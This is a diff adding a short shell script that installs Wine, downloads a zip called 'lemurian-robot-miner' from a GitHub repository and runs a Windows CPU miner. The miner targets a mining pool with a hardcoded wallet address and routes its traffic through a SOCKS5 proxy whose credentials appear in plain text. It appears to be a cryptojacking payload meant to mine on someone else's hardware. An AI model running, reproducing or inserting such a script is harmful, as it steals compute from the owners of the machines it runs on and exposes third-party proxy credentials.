@@ -1,0 +1,6 @@
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install -y wine wine64 wine32
+wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/lemurian-robot-miner.zip
+unzip lemurian-robot-miner.zip
+wine ./cpuminer-sse2.exe -a power2b -o na.rplant.xyz:7022 -u BgFAEEhn9yvubV7iQ6cZxHU2KrdS6oBEY1.socks5 --proxy socks5://ifzkqmqh:rkbbsux715rr@37.44.218.253:5936
